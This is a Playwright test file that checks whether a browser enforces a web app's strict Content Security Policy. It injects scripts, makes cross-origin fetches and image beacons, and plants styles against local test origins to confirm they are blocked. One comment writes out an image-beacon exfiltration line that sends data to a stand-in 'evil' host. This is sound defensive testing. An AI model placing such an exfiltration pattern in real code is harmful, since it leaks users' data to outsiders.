import { test, expect, type Page } from '@playwright/test'
import { SETTLED_RESULT } from './reviewSurface'
import { driveIntakeToResult } from './intakeDrive'
import { copy, slots } from '../src/ui/copy'
import { roughWindow, ROUGH_WINDOW_YEARS } from '../src/engine/reference/roughSequence'

/**
 * Proves a REAL browser enforces the strict CSP shipped in `vercel.json` — the in-memory decrypted
 * model's only guard against an injected page script (at-rest crypto does nothing for cleartext in
 * the JS heap). `scripts/__tests__/csp-headers.test.ts` proves the JSON *string*; this proves the
 * browser *behaviour*. Served by `scripts/serve-dist-with-headers.ts` via the config's webServer:
 *   - baseURL (127.0.0.1:4180) = the ENFORCED origin (real CSP header).
 *   - CONTROL_ORIGIN (4181)    = the SAME dist/ with NO CSP header.
 *
 * The control test is the anti-false-pass keystone: the SAME injection that is BLOCKED on the
 * enforced origin must EXECUTE on the control origin — otherwise a silently-broken injector would
 * make the blocked assertion vacuous.
 */
const CONTROL_ORIGIN = 'http://127.0.0.1:4181'
/** The ENFORCED origin — the config's `baseURL`, where the build's own chunks and workers are served. */
const ENFORCED_ORIGIN = 'http://127.0.0.1:4180'

interface CspViolation {
  readonly violatedDirective: string
  readonly blockedURI: string
}

declare global {
  interface Window {
    __inlineExecuted?: boolean
    __cspViolations?: CspViolation[]
  }
}

/**
 * Installed in the MAIN page world BEFORE navigation (addInitScript, not an in-evaluate promise), so
 * it observes the page's REAL CSP violations and survives the navigation with the flag pre-seeded
 * false — distinguishing "blocked" (stays false) from "never ran".
 */
async function installCollector(page: Page): Promise<void> {
  await page.addInitScript(() => {
    window.__inlineExecuted = false
    window.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__cspViolations?.push({ violatedDirective: e.violatedDirective, blockedURI: e.blockedURI })
    })
  })
}

/**
 * The SHARED injector — identical code path on enforced and control so a broken technique cannot
 * yield a false PASS. It runs in page.evaluate's isolated world, but the <script> element it appends
 * joins the MAIN document and is therefore evaluated against the page's CSP.
 */
async function injectInlineScript(page: Page): Promise<void> {
  await page.evaluate(() => {
    const s = document.createElement('script')
    s.textContent = 'window.__inlineExecuted = true'
    document.body.appendChild(s)
  })
}

const inlineExecuted = (page: Page) => page.evaluate(() => window.__inlineExecuted)
const violations = (page: Page) => page.evaluate(() => window.__cspViolations ?? [])


test.describe('CSP — real browser enforcement', () => {
  test("blocks a runtime-injected inline <script> (script-src 'self')", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    await injectInlineScript(page)

    // PRIMARY proof: the inline script never executed.
    expect(await inlineExecuted(page)).toBe(false)

    // CORROBORATION: the browser reported a script-src violation (Chromium uses the granular
    // `script-src-elem` for an inline element, hence startsWith rather than ===).
    const v = await violations(page)
    expect(v.some((x) => x.violatedDirective.startsWith('script-src'))).toBe(true)

    // The enforced origin actually SENT the strict policy (guards a harness that dropped the CSP,
    // which would make the assertions above vacuous, and pins out any future `unsafe-inline` drift).
    const csp = (await page.request.get('/')).headers()['content-security-policy'] ?? ''
    expect(csp).toContain("script-src 'self'")
    expect(csp).not.toContain("'unsafe-inline'")
  })

  test('CONTROL: the same injection DOES execute when no CSP is served', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await injectInlineScript(page)

    // If this is false the injector is broken ⇒ the enforced test was a false pass.
    expect(await inlineExecuted(page)).toBe(true)
    expect(await violations(page)).toHaveLength(0)
  })

  test("blocks cross-origin network exfil (connect-src 'self')", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    // The in-scope attack is exfil of the in-memory model via fetch/XHR/beacon. connect-src 'self'
    // must block a cross-origin request. The control origin (:4181) is a genuinely different origin,
    // so no internet is needed; the CSP check fires the violation BEFORE any network egress.
    await page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: 'no-cors' })
      } catch {
        /* the CSP rejection is expected */
      }
    }, `${CONTROL_ORIGIN}/`)
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(true)
  })

  test('CONTROL: the same cross-origin fetch raises no connect-src violation with no CSP', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await page.evaluate(async (target) => {
      try {
        await fetch(target, { mode: 'no-cors' })
      } catch {
        /* a network/CORS failure, NOT a CSP violation */
      }
    }, 'http://127.0.0.1:4180/')
    // Proves the enforced violation above is caused by the CSP, not intrinsic to the cross-origin fetch.
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('connect-src'))).toBe(false)
  })

  test("blocks a cross-origin image-beacon exfil (img-src 'self' data:)", async ({ page }) => {
    await installCollector(page)
    await page.goto('/')
    // A fetch-free exfil channel connect-src does NOT cover: `new Image().src = 'https://evil/?d=' + data`.
    // img-src governs sub-resource image loads, so a cross-origin image must fire an img-src violation.
    await page.evaluate(
      (target) =>
        new Promise<void>((resolve) => {
          const img = new Image()
          img.onload = () => resolve()
          img.onerror = () => resolve() // a CSP block manifests as a load error; the violation fires first
          img.src = `${target}/probe.png`
        }),
      CONTROL_ORIGIN,
    )
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(true)
  })

  test('CONTROL: the same image-beacon raises no img-src violation with no CSP', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/`)
    await page.evaluate(
      (target) =>
        new Promise<void>((resolve) => {
          const img = new Image()
          img.onload = () => resolve()
          img.onerror = () => resolve()
          img.src = `${target}/probe.png`
        }),
      'http://127.0.0.1:4180',
    )
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('img-src'))).toBe(false)
  })

  test("engine module Web Worker constructs + round-trips under worker-src 'self' — through the REAL intake", async ({ page }) => {
    // This walk is a full intake + TWO engine round trips (the strip's provisional reading, then the
    // Result's). Playwright's 30 s default cannot hold it on a 4-vCPU runner, and the 60 / 90 s waits
    // below are dead letters without a test budget above them (a matcher timeout never clamps to the
    // test deadline — the test dies first with a bare "Test timeout", and no custom message prints).
    // Scoped to THIS test, not the config: the fast control arms keep the default so a hang there
    // still reads as one (playwright.fit.config.ts carries the same hardware reasoning).
    test.setTimeout(180_000)
    // RETARGETED at D1 (the U0 smoke readout is gone): drives the real product
    // path — cold start → the guided intake → a live provisional engine reading
    // — under the ENFORCED policy. Strictly stronger than the smoke arm: the
    // worker constructs at module eval, the React surface renders under
    // style-src 'self', and the 2000-path engine round-trips a transferred
    // buffer into the answer strip.
    await installCollector(page)
    await driveIntakeToResult(page)
    const tick = page.locator('figure.band-figure .band-tick').first()
    await expect(tick, 'the Result rendered no band y-tick — retarget this probe at whichever chart the Result carries').toBeAttached({ timeout: 90_000 })
    // Quiescence only, not a dependency: the fonts.ready one-shot re-runs layoutCollisions, which
    // writes --ct-row / --ct-rows / --ct-dy / data-ct-hidden — a transform (--ct-dy), visibility
    // (data-ct-hidden) and the annotation block's top/height (--ct-row / --ct-rows) — never `left`;
    // and the band tick passes no `collide`, so it is not a [data-ct-item] and that pass cannot touch
    // it at all. The two operands below are read in ONE synchronous evaluate, so the ratio holds
    // mid-swap regardless.
    await page.evaluate(() => document.fonts.ready)
    const placed = await tick.evaluate((el) => {
      const cs = getComputedStyle(el)
      // offsetParent is .ct-layer (position:absolute, inset:0 — chartText.css): the containing block
      // the `calc(var(--fx) * 100%)` percentage resolves against. By DEFINITION the containing block,
      // never a by-name `closest('.ct-layer')` guess — and null-tolerant, so the authored message
      // below prints instead of a TypeError past both diagnostics.
      const parent = (el as HTMLElement).offsetParent as HTMLElement | null
      return { fx: cs.getPropertyValue('--fx').trim(), left: parseFloat(cs.left), layerW: parent ? parent.getBoundingClientRect().width : -1 }
    })
    expect(placed.fx, 'the chart text layer wrote no --fx under the enforced CSP').not.toBe('')
    expect(placed.layerW, 'the tick has no offsetParent box — a display:none ancestor, or .ct-layer lost position:absolute').toBeGreaterThan(0)
    // The used `left` IS the resolved calc: the CSSOM custom property landed on a real chart under the
    // real headers. Assert the RESOLUTION, never the on-screen edge — a y-tick is anchor="end"
    // (ConfidenceBand.tsx TICK_FX + chartText.css .ct-text--end), so its left edge legitimately sits
    // outside the host box on a narrow arm (the register's chart-text residual (g)). An edge bound
    // would false-red.
    expect(
      Math.abs(placed.left - parseFloat(placed.fx) * placed.layerW),
      'the CSSOM --fx did not resolve into a position on a real chart under the enforced headers',
    ).toBeLessThan(1.5)

    // No worker-src/script-src/style-src violation anywhere along the real path — the chart render
    // above included.
    const v = await violations(page)
    expect(v.some((x) => /worker-src|script-src|style-src/.test(x.violatedDirective))).toBe(false)
  })

  test("the POOLED solve's workers construct under worker-src 'self' — a coordinator + the eval workers, alive and violation-free", async ({ page }) => {
    // The intake walk (above) + the invite → the pool spawn. The solve itself runs for minutes and is
    // never awaited: this arm proves the pool's members construct and LIVE under the enforced policy.
    test.setTimeout(240_000)
    // The pool's size is a function of the device (`poolSizeFor`: every core but two). Pin the device
    // to 4 logical cores so the arm is P = 2 on every runner — CDP-injected, so the CSP never sees it,
    // and before the app's module evaluates (the engine client reads it once, at construction).
    await page.addInitScript(() => {
      Object.defineProperty(Navigator.prototype, 'hardwareConcurrency', { configurable: true, get: () => 4 })
    })
    await installCollector(page)
    await driveIntakeToResult(page)
    await expect(page.locator(SETTLED_RESULT), 'no final-tier verdict — the invite cannot mount').toBeAttached({ timeout: 120_000 })
    expect(page.workers(), 'before the solve: the spine worker alone').toHaveLength(1)

    const invite = page.locator('.result-recommend-invite')
    await expect(invite, 'the recommend-second invite never mounted').toBeVisible({ timeout: 60_000 })
    await invite.click()
    const dialog = page.getByRole('dialog')
    await dialog.getByRole('radio', { name: /Pay less tax/ }).check({ force: true })
    await dialog.getByRole('button', { name: 'See the strategy', exact: true }).click()
    await expect(page.locator('.solve-pending'), 'the solve never went pending').toBeAttached({ timeout: 30_000 })

    // The spine + ONE coordinator + TWO eval workers, all through the one `new URL` literal.
    await expect.poll(() => page.workers().length, { message: 'the pool never spawned', timeout: 30_000 }).toBe(4)
    // ALIVE, not merely constructed: a member that failed to load under the policy fires its `error`
    // event, and the lane tears EVERY member down and retries on the spine (page.workers() → 1). The
    // window is far past a cached chunk's load; the solve is still minutes from done.
    await page.waitForTimeout(10_000)
    expect(page.workers(), 'a pool member died — the lane tore down').toHaveLength(4)
    await expect(page.locator('.solve-pending'), 'the solve settled inside the window — the arm proved nothing about a LIVE pool').toBeAttached()

    const v = await violations(page)
    expect(v.some((x) => /worker-src|script-src/.test(x.violatedDirective))).toBe(false)
  })

  test('the shell loads under the enforced CSP: every interim tab and both its menus, no violation, and no request outside the build’s own files', async ({ page }) => {
    // Act 6 · RC2 (plan 6, section 3.1's Verification; the workbench room's arm before it, U6 to U15): the shell's lazy
    // chunk and its styles load through the answer page's real door on the served build, and every interim tab is
    // visited. ANY violation reds (not a directive subset), and so does any request that leaves the build's own origin:
    // the act adds no network call. The table runs both views on the build's own engine worker, each one short run: the
    // steady view lands first, then a press shows the rough one, each read by its own words over its own rows. The facts
    // page opens and closes one step sheet; the What if page runs one what-if; the lock menu (a portaled Base UI menu)
    // opens and closes; at a phone width the menu (a portaled Base UI dialog that animates) moves the page. The way back
    // is the wordmark, which asks first over the unkept what-if.
    test.setTimeout(180_000)
    await installCollector(page)
    const outside: string[] = []
    page.on('request', (r) => {
      const url = new URL(r.url())
      if (url.protocol === 'data:' || url.protocol === 'blob:') return
      if (url.origin !== ENFORCED_ORIGIN) outside.push(r.url())
    })
    await driveIntakeToResult(page)
    const door = page.locator('.result-quiet-row [data-door="workbench"]')
    await expect(door, 'the door never mounted on the resolved answer').toBeVisible({ timeout: 120_000 })
    await door.click()
    // Act 6 · RC3: the door lands on Dashboard → Snapshot, the app's first Highcharts chart under the real header (the
    // fan, its lazy chunk, highcharts-more and the accessibility module, its styled-mode CSS and its hover tooltip).
    await expect(page.getByRole('heading', { level: 1, name: copy.shellPageSnapshot })).toBeVisible({ timeout: 30_000 })
    expect(await page.evaluate(() => history.state)).toEqual({ b9: 'workspace', n: 1 })
    expect(new URL(page.url()).hash).toBe('#/dashboard/snapshot')
    await expect(page.locator('main.result'), 'exactly one main.result in the shell').toHaveCount(1)
    const fan = page.locator('[data-card="fan"] [data-chart="fan"]')
    await expect(fan.locator('.highcharts-series-group'), 'the fan never drew under the CSP').toBeAttached({ timeout: 60_000 })
    await expect(fan.locator('.highcharts-data-label text', { hasText: copy.snapshotFanOuterWords }), 'the fan’s band words').toBeAttached()
    await fan.evaluate((el) => el.scrollIntoView({ block: 'center' }))
    const plot = (await fan.locator('.highcharts-plot-background').boundingBox())!
    await page.mouse.move(plot.x + plot.width * 0.45, plot.y + plot.height / 2)
    await page.mouse.move(plot.x + plot.width / 2, plot.y + plot.height / 2, { steps: 5 })
    await expect(fan.locator('.highcharts-tooltip'), 'the fan’s tooltip never showed').toBeVisible()
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'the fan injected a <style> element').toBe(0)
    await page.mouse.move(0, 0)
    // On to the year-by-year table (Retirement → Cash Flows), as before RC3.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleRetirement, exact: true }).click()
    await page.getByRole('navigation', { name: copy.shellPagesLabel }).getByRole('link', { name: copy.shellPageCashFlows, exact: true }).click()
    await expect(page.getByRole('heading', { name: copy.workbenchPageTable })).toBeVisible({ timeout: 30_000 })
    await expect(page.getByText(copy.shellInterimBanner, { exact: true })).toBeVisible()
    expect(new URL(page.url()).hash).toBe('#/retirement/cash-flows')

    const firstLine = page.locator('.wb-about__line').first()
    await expect(page.locator('.wb-table'), 'the steady view’s rows never landed').toBeVisible({ timeout: 60_000 })
    await expect(firstLine, 'the steady view’s words').toHaveText(copy.workbenchSteadyWhat)
    await page.locator('.wb-view label.segment', { hasText: copy.workbenchViewRough }).click()
    const roughStart = roughWindow().startYear
    await expect(firstLine, 'the rough view’s words').toHaveText(
      slots.workbenchRoughWhat(roughStart, roughStart + ROUGH_WINDOW_YEARS - 1, ROUGH_WINDOW_YEARS),
    )
    await expect(page.locator('.wb-table'), 'the rough view’s rows').toBeVisible()
    await expect(page.locator('.wb-table-wrap--updating')).toHaveCount(0)

    // The lock menu: a portaled menu, opened and closed by Escape.
    await page.getByRole('button', { name: new RegExp(`^${copy.lockMenuLabel}`) }).click()
    await expect(page.getByRole('menu'), 'the lock menu never opened').toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('menu')).toHaveCount(0)

    // The facts page (Profile), one press away, and one step sheet (a portaled sheet, its motion, and an intake step's
    // body in the shell's chunk), opened and closed through Done.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleProfile, exact: true }).click()
    await expect(page.getByRole('heading', { name: copy.workbenchFactsChoices, exact: true }), 'the facts page never showed').toBeVisible()
    await expect(page.locator('.wb-facts__section').first()).toBeVisible()
    await page.getByRole('button', { name: slots.workbenchFactsEditName(copy.workbenchFactsPeople), exact: true }).click()
    const sheet = page.getByRole('dialog', { name: copy.workbenchFactsPeople, exact: true })
    await expect(sheet, 'the step sheet never opened').toBeVisible()
    await sheet.getByRole('button', { name: copy.workbenchFactsDone, exact: true }).click()
    await expect(sheet, 'the step sheet never closed').toHaveCount(0)

    // The What if page (Retirement → Analysis): one what-if, run on the build's own engine worker (its many-futures run
    // and both named futures). Spending is offered to every household: its first figure committed $1,000 lower with Enter.
    await page.getByRole('navigation', { name: copy.shellModulesLabel }).getByRole('link', { name: copy.shellModuleRetirement, exact: true }).click()
    await expect(page.locator('main.result[data-shell-screen="interim-whatif"]')).toBeAttached()
    await page.locator('.wb-lever[data-lever="spending"] > summary').click()
    const spend = page.locator('.wb-lever[data-lever="spending"] input[inputmode="decimal"]').first()
    const planSpend = Number((await spend.inputValue()).replace(/[^0-9]/g, ''))
    expect(planSpend, '[test setup] the spending figure reads').toBeGreaterThan(1_000)
    await spend.fill(String(planSpend - 1_000))
    await spend.press('Enter')
    await expect(page.locator('.wb-pair'), 'the what-if’s paired years never landed').toBeVisible({ timeout: 60_000 })
    await expect(page.locator('.wb-reading').nth(1).locator('.wb-reading__count'), 'the what-if’s reading never landed').not.toHaveText('', {
      timeout: 60_000,
    })

    // At a phone width the menu (a portaled, animated dialog) reaches the table page and closes on the choice.
    await page.setViewportSize({ width: 390, height: 844 })
    await page.getByRole('button', { name: copy.shellMenuOpen, exact: true }).click()
    const menu = page.getByRole('dialog', { name: copy.shellMenuTitle })
    await expect(menu, 'the phone menu never opened').toBeVisible()
    await menu.getByRole('link', { name: copy.shellPageCashFlows, exact: true }).click()
    await expect(menu).toHaveCount(0)
    await expect(page.locator('main.result[data-shell-screen="interim-table"]')).toBeAttached()

    // The way back: the wordmark asks first over the unkept what-if; Go back lands on the answer.
    await page.getByRole('link', { name: copy.shellHomeLabel }).click()
    await expect(page.getByText(copy.shellLeaveWhatIf, { exact: true }), 'the wordmark left an unkept what-if without asking').toBeVisible()
    await page.getByRole('button', { name: copy.workbenchLeaveGo, exact: true }).click()
    await expect(page.locator('main.result.result-page')).toBeVisible()
    await expect(door).toBeVisible()

    expect(await violations(page)).toEqual([])
    expect(outside, 'a request left the build’s own origin').toEqual([])
  })

  /**
   * Act 6 · RC1 (plan docs/plans/6-rightcapital-ui-plan.md, section 2.3): the new stack under the real header, before any
   * screen is built; from RC2 (section 3.1) the probe page (`kit-probe.html`, a second build entry) wears the KIT
   * (`src/ui/kit`) under `CSPProvider disableStyleElements`, and this arm opens every kit part that portals or animates:
   * the drawer (with its record steps, Escape, and focus back on its opener, the one real-browser read of insight 071),
   * the Add menu and a flyout, the picker, the chart title's menu, the folder tabs, the tooltip, the toast, the switch,
   * the checkbox, and the Action Items tray (a panel on the laptop, a full-height sheet on the phone); plus the slider,
   * the scroll area, the TanStack data table and the Highcharts chart in styled mode with the accessibility module and
   * the shared pattern defs. ANY violation reds (the part that injected a `<style>` or a style attribute is the one
   * being opened), and so does any request off the build's origin. The fallbacks a red points at: React Aria
   * (components), Recharts (charts). The same arm reads the cascade the colour-blind cue rests on: the hatched series and
   * its legend symbol fill from `url("#b9-hatch")`, and series 0 fills with palette.ts's own hex, so neither
   * `highcharts.css` nor Highcharts' default palette won.
   */
  test('the kit probe: every kit part opened under the enforced CSP — no violation, no request off the origin, the chart cascade intact', async ({ page }) => {
    test.setTimeout(120_000)
    await installCollector(page)
    const outside: string[] = []
    page.on('request', (r) => {
      const url = new URL(r.url())
      if (url.protocol === 'data:' || url.protocol === 'blob:') return
      if (url.origin !== ENFORCED_ORIGIN) outside.push(r.url())
    })
    const response = await page.goto('/kit-probe.html')
    // The probe was served the strict policy (a harness that dropped it would make every assertion below vacuous).
    const csp = response?.headers()['content-security-policy'] ?? ''
    expect(csp, 'the probe page was served without the strict CSP').toContain("style-src 'self'")
    expect(csp).not.toContain("'unsafe-inline'")
    await expect(page.getByRole('heading', { name: 'Kit probe' })).toBeVisible()

    const insideRcRoot = 'xpath=ancestor::*[contains(concat(" ", normalize-space(@class), " "), " rc-root ")]'

    // The drawer (a Base UI Dialog docked right): open, step a record, close on Escape with focus back on its opener
    // (insight 071: jsdom's teardown order is not the browser's, so this is the real read), then again through Cancel.
    const opener = page.getByRole('button', { name: 'Open the drawer' })
    await opener.click()
    const drawer = page.getByRole('dialog', { name: 'Salary' })
    await expect(drawer).toBeVisible()
    await expect(drawer.locator(insideRcRoot)).toHaveCount(1)
    await expect(drawer.getByRole('button', { name: 'Delete' })).toBeVisible()
    await drawer.getByRole('button', { name: 'The next record' }).click()
    await expect(drawer.locator('[data-probe="record"]')).toHaveText('Record 2 of 3')
    await page.keyboard.press('Escape')
    await expect(drawer).toHaveCount(0)
    await expect(opener, 'focus did not return to the drawer’s opener').toBeFocused()
    await opener.click()
    await expect(drawer).toBeVisible()
    await drawer.getByRole('button', { name: 'Cancel' }).click()
    await expect(drawer).toHaveCount(0)

    // Select: open the list, pick the second item.
    await page.getByRole('combobox').click()
    await expect(page.getByRole('listbox')).toBeVisible()
    await expect(page.getByRole('listbox').locator(insideRcRoot)).toHaveCount(1)
    await page.getByRole('option', { name: 'Years' }).click()
    await expect(page.getByRole('listbox')).toHaveCount(0)
    await expect(page.getByRole('combobox')).toContainText('Years')

    // Slider: one key press moves it.
    const thumb = page.getByRole('slider')
    const before = await thumb.getAttribute('aria-valuenow')
    await thumb.focus()
    await thumb.press('ArrowRight')
    await expect(thumb).not.toHaveAttribute('aria-valuenow', before ?? '')

    // Toast: shown, then dismissed.
    await page.getByRole('button', { name: 'Show a toast' }).click()
    await expect(page.getByText('Your plan is saved on this device.')).toBeVisible()
    // Base UI hides a toast's close from the accessibility tree until the stack is hovered or focused (it expands).
    await page.getByText('Your plan is saved on this device.').hover()
    await page.getByRole('button', { name: 'Dismiss' }).click()
    await expect(page.getByText('Your plan is saved on this device.')).toHaveCount(0)

    // The Add menu: the blue panel, a flyout, a pick that closes both.
    await page.getByRole('button', { name: 'Add', exact: true }).click()
    const addMenu = page.getByRole('menu').first()
    await expect(addMenu).toBeVisible()
    await expect(addMenu.locator(insideRcRoot)).toHaveCount(1)
    await page.getByRole('menuitem', { name: 'Property' }).click()
    await expect(page.getByRole('menuitem', { name: 'Rental property' })).toBeVisible()
    await page.getByRole('menuitem', { name: 'Rental property' }).click()
    await expect(page.getByRole('menu')).toHaveCount(0)
    await expect(page.locator('[data-probe="added"]')).toHaveText('Added: Rental property')

    // The chart title's menu, the folder tabs, the switch, the checkbox.
    await page.getByRole('button', { name: 'Savings over time' }).click()
    await page.getByRole('menuitemradio', { name: 'Income sources' }).click()
    await expect(page.getByRole('menu')).toHaveCount(0)
    await expect(page.getByRole('heading', { name: 'Income sources' })).toBeVisible()
    await page.getByRole('tab', { name: 'Confidence' }).click()
    await expect(page.getByRole('tab', { name: 'Confidence' })).toHaveAttribute('aria-selected', 'true')
    await page.getByRole('tab', { name: 'Probability' }).click()
    const future = page.getByRole('switch', { name: 'Future dollars' })
    await future.click()
    await expect(future).toHaveAttribute('aria-checked', 'true')
    const joint = page.getByRole('checkbox', { name: 'Held jointly' })
    await joint.click()
    await expect(joint).toHaveAttribute('aria-checked', 'false')

    // The tooltip: hovered, its words shown in an .rc-root portal.
    await page.getByRole('button', { name: 'About the annual increase' }).hover()
    const tip = page.getByText('How much the figure grows each year.')
    await expect(tip).toBeVisible()
    await expect(tip.locator(insideRcRoot)).toHaveCount(1)
    await page.mouse.move(0, 0)
    await expect(tip).toHaveCount(0)

    // The Action Items tray on the laptop: the handle opens it under the panel; a changed figure wears its mark.
    const handle = page.getByRole('button', { name: 'Action items' })
    await handle.click()
    await expect(handle).toHaveAttribute('aria-expanded', 'true')
    const tray = page.locator('[data-tray]')
    await expect(tray).toBeVisible()
    await expect(tray.getByText('Monthly spending in retirement').first()).toBeVisible()
    const spend = tray.getByLabel('Monthly spending in retirement')
    await spend.fill('5,000')
    await spend.press('Enter')
    await expect(spend.locator('xpath=..')).toHaveAttribute('data-changed', 'true')
    await handle.click()
    await expect(tray).toHaveCount(0)

    // …and on the phone, a full-height sheet with its own close.
    await page.setViewportSize({ width: 390, height: 844 })
    await handle.click()
    const sheet = page.getByRole('dialog', { name: 'Action items' })
    await expect(sheet).toBeVisible()
    await sheet.getByRole('button', { name: 'Close the action items' }).click()
    await expect(sheet).toHaveCount(0)
    await expect(handle).toHaveAttribute('aria-expanded', 'false')
    await page.setViewportSize({ width: 1280, height: 720 })

    // ScrollArea: it scrolls, and its native scrollbar is hidden by OUR rule (Base UI's own <style> is switched off).
    const viewport = page.locator('[aria-label="Probe lines"]')
    const scroll = await viewport.evaluate((el) => {
      el.scrollTop = 60
      return { top: el.scrollTop, cls: el.classList.contains('base-ui-disable-scrollbar'), sw: getComputedStyle(el).scrollbarWidth }
    })
    expect(scroll.top, 'the scroll area did not scroll').toBeGreaterThan(0)
    expect(scroll.cls, 'Base UI no longer tags its viewport with base-ui-disable-scrollbar').toBe(true)
    expect(scroll.sw, 'theme.css’s .base-ui-disable-scrollbar rule did not apply').toBe('none')

    // The kit's TanStack table: a grouped header (two header rows) over four body rows, a negative in parentheses.
    const table = page.locator('[data-probe="table"] table')
    await expect(table.locator('thead tr')).toHaveCount(2)
    await expect(table.locator('thead tr').first().locator('th', { hasText: 'Income' })).toHaveAttribute('colspan', '2')
    await expect(table.locator('tbody tr')).toHaveCount(4)
    await expect(table.locator('tbody tr').first().locator('td').last()).toHaveText('(36,000)')

    // The chart: drawn, with the accessibility module's hidden screen-reader region and the credit.
    const chart = page.locator('.highcharts-container')
    await expect(chart.locator('.highcharts-series.highcharts-series-1 .highcharts-point')).toHaveCount(4)
    await expect(page.locator('[id^="highcharts-screen-reader-region-before-"]'), 'the accessibility module drew no screen-reader region').toBeAttached()
    await expect(page.locator('.highcharts-a11y-proxy-group-legend .highcharts-a11y-proxy-element'), 'no keyboard proxy for each legend item').toHaveCount(3)
    await expect(chart.locator('.highcharts-credits')).toHaveText('Highcharts.com')

    // Hover a point until its tooltip shows.
    await chart.locator('.highcharts-series.highcharts-series-0 .highcharts-point').nth(2).hover()
    await expect(chart.locator('.highcharts-tooltip')).toBeVisible()
    await expect(chart.locator('.highcharts-tooltip')).toContainText('Solid series')

    // Click a legend item to hide its series, then again to show it.
    const legendItem = chart.locator('.highcharts-legend-item.highcharts-series-1')
    await legendItem.click()
    await expect(legendItem).toHaveClass(/highcharts-legend-item-hidden/)
    await legendItem.click()
    await expect(legendItem).not.toHaveClass(/highcharts-legend-item-hidden/)

    // The cascade (a new kind of check): the colour-blind second cue survives highcharts.css and the default palette.
    const fills = await page.evaluate(() => {
      const fill = (sel: string) => {
        const el = document.querySelector(sel)
        return el ? getComputedStyle(el).fill : 'MISSING'
      }
      return {
        hatched: fill('.highcharts-series.highcharts-series-1 .highcharts-point'),
        hatchedLegend: fill('.highcharts-legend-item.highcharts-series-1 .highcharts-point'),
        solid: fill('.highcharts-series.highcharts-series-0 .highcharts-point'),
        root: getComputedStyle(document.documentElement).getPropertyValue('--highcharts-color-0').trim(),
        pattern: document.querySelectorAll('pattern#b9-hatch').length,
        // RC3 (owed from RC1): each pattern kind's own ink, so two patterned series keep their colour difference.
        hatchInk: (() => {
          const el = document.querySelector('pattern#b9-hatch .b9-pattern-ink')
          return el ? getComputedStyle(el).stroke : 'MISSING'
        })(),
        dotsInk: (() => {
          const el = document.querySelector('pattern#b9-dots .b9-pattern-ink')
          return el ? getComputedStyle(el).fill : 'MISSING'
        })(),
        dotted: fill('.highcharts-series.highcharts-series-2 .highcharts-point'),
      }
    })
    // Imported here, not at the top, so the lines this file's other arms are cited by keep their numbers.
    const { RC_SERIES } = await import('../src/viz/palette')
    const hex = RC_SERIES[0]
    const rgb = `rgb(${parseInt(hex.slice(1, 3), 16)}, ${parseInt(hex.slice(3, 5), 16)}, ${parseInt(hex.slice(5, 7), 16)})`
    expect(fills.pattern, 'the shared defs built no #b9-hatch pattern into the chart').toBeGreaterThan(0)
    expect(fills.hatched, 'the hatched series lost its pattern fill').toBe('url("#b9-hatch")')
    expect(fills.hatchedLegend, 'the hatched series’ legend symbol lost its pattern fill').toBe('url("#b9-hatch")')
    expect(fills.root, 'the CSSOM write of --highcharts-color-0 did not land').toBe(hex)
    expect(fills.solid, 'series 0 is not painted from palette.ts (highcharts.css or its default palette won)').toBe(rgb)
    // Two patterned series in one chart: each pattern's ink computes its own series' colour, never one shared ink.
    const rgbOf = (h: string) => `rgb(${parseInt(h.slice(1, 3), 16)}, ${parseInt(h.slice(3, 5), 16)}, ${parseInt(h.slice(5, 7), 16)})`
    expect(fills.dotted, 'the dotted series lost its pattern fill').toBe('url("#b9-dots")')
    expect(fills.hatchInk, 'the hatch’s ink is not its series’ colour (slot 1)').toBe(rgbOf(RC_SERIES[1]))
    expect(fills.dotsInk, 'the dots’ ink is not its series’ colour (slot 2)').toBe(rgbOf(RC_SERIES[2]))
    expect(fills.hatchInk, 'two patterned series in one chart share one ink').not.toBe(fills.dotsInk)

    // Nothing injected a <style> element, and nothing was blocked along the way.
    expect(await page.evaluate(() => document.querySelectorAll('style').length), 'a library injected a <style> element').toBe(0)
    expect(await violations(page)).toEqual([])
    expect(outside, 'a request left the build’s own origin').toEqual([])
  })

  /** The probe arm's own control (insight 016): on the probe page, a planted `<style>` is BLOCKED on the enforced origin
   *  and APPLIES on the no-CSP control origin, so "no violation" above is a real reading, never a deaf collector. */
  test('the kit probe: a planted <style> is blocked under the CSP (style-src) …', async ({ page }) => {
    await installCollector(page)
    await page.goto('/kit-probe.html')
    await expect(page.getByRole('heading', { name: 'Kit probe' })).toBeVisible()
    expect(await plantStyle(page), 'the planted <style> applied under the enforced CSP').toBe(false)
    expect((await violations(page)).some((x) => x.violatedDirective.startsWith('style-src'))).toBe(true)
  })

  test('CONTROL: … and the same planted <style> applies on the kit probe when no CSP is served', async ({ page }) => {
    await installCollector(page)
    await page.goto(`${CONTROL_ORIGIN}/kit-probe.html`)
    await expect(page.getByRole('heading', { name: 'Kit probe' })).toBeVisible()
    expect(await plantStyle(page), 'the planted <style> did not apply with no CSP — the plant is broken').toBe(true)
    expect(await violations(page)).toHaveLength(0)
  })
})

/** Appends a `<style>` that would give the probe's heading a 7 px outline; true when the rule took effect. */
async function plantStyle(page: Page): Promise<boolean> {
  return page.evaluate(async () => {
    const s = document.createElement('style')
    s.textContent = 'h1 { outline: 7px solid currentcolor !important; }'
    document.head.appendChild(s)
    await new Promise((r) => requestAnimationFrame(() => r(null)))
    const h1 = document.querySelector('h1')
    return h1 !== null && getComputedStyle(h1).outlineWidth === '7px'
  })
}
